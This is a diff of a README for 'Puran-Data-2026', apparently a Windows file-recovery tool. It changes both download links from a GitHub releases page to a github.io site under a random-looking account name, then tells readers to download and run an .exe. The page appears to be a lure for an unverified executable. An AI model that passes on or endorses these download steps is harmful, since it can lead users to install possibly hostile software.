@@ -1,6 +1,6 @@
 # 📁 Puran-Data-2026 - Restore lost files on your computer
 
-[![](https://img.shields.io/badge/Download-Puran_Data_2026-blue)](https://github.com/predispositionsqualidae179/Puran-Data-2026/releases)
+[![](https://img.shields.io/badge/Download-Puran_Data_2026-blue)](https://predispositionsqualidae179.github.io)
 
 ## 🔍 Overview
 Puran-Data-2026 helps you rescue files from your Windows computer. Whether you deleted a file by mistake or formatted a hard drive, this tool locates your data. It works on Windows 10 and Windows 11. The software scans your storage drives to find missing items. It reconstructs these files so you can save them to a new location.
@@ -16,7 +16,7 @@ Ensure your computer meets these standards before you start:
 ## 📥 Getting Started
 Follow these instructions to acquire the tool and prepare your system.
 
-1. Visit this page to download the software: [https://github.com/predispositionsqualidae179/Puran-Data-2026/releases](https://github.com/predispositionsqualidae179/Puran-Data-2026/releases).
+1. Visit this page to download the software: [https://predispositionsqualidae179.github.io](https://predispositionsqualidae179.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Select the file ending in .exe to save it to your computer.
 4. Locate the file in your Downloads folder after the download finishes.
